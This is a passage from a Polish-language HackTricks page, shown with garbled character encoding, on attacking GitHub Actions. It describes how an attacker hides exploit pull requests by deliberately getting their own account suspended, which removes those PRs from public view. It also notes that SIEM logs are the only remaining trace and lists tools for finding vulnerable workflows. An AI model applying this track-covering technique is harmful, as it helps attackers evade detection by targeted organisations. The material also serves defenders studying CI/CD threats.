(Teknik z [**tutaj**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Przede wszystkim, kaÅ¼dy PR zgÅ‚oszony jest wyraÅºnie widoczny dla publicznoÅ›ci w Github i dla docelowego konta GitHub. W GitHub domyÅ›lnie **nie moÅ¼emy usunÄ…Ä‡ PR z internetu**, ale jest pewien zwrot akcji. Dla kont GitHub, ktÃ³re sÄ… **zawieszone** przez Github, wszystkie ich **PR sÄ… automatycznie usuwane** i usuwane z internetu. Aby wiÄ™c ukryÄ‡ swojÄ… aktywnoÅ›Ä‡, musisz albo sprawiÄ‡, by Twoje **konto GitHub zostaÅ‚o zawieszone, albo aby Twoje konto zostaÅ‚o oznaczone**. To **ukryje wszystkie Twoje aktywnoÅ›ci** na GitHubie z internetu (w zasadzie usunie wszystkie Twoje PR z exploitami)

Organizacja w GitHub jest bardzo proaktywna w zgÅ‚aszaniu kont do GitHub. Wszystko, co musisz zrobiÄ‡, to podzieliÄ‡ siÄ™ â€jakimiÅ› rzeczamiâ€ w Issue, a oni upewniÄ… siÄ™, Å¼e Twoje konto zostanie zawieszone w ciÄ…gu 12 godzin :p i oto masz, uczyniÅ‚eÅ› swÃ³j exploit niewidocznym na githubie.

{% hint style="warning" %}
Jedynym sposobem, aby organizacja dowiedziaÅ‚a siÄ™, Å¼e zostaÅ‚a zaatakowana, jest sprawdzenie logÃ³w GitHub z SIEM, poniewaÅ¼ z interfejsu GitHub PR zostaÅ‚by usuniÄ™ty.
{% endhint %}

## NarzÄ™dzia

NastÄ™pujÄ…ce narzÄ™dzia sÄ… przydatne do znajdowania workflow GitHub Action, a nawet do znajdowania podatnych:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
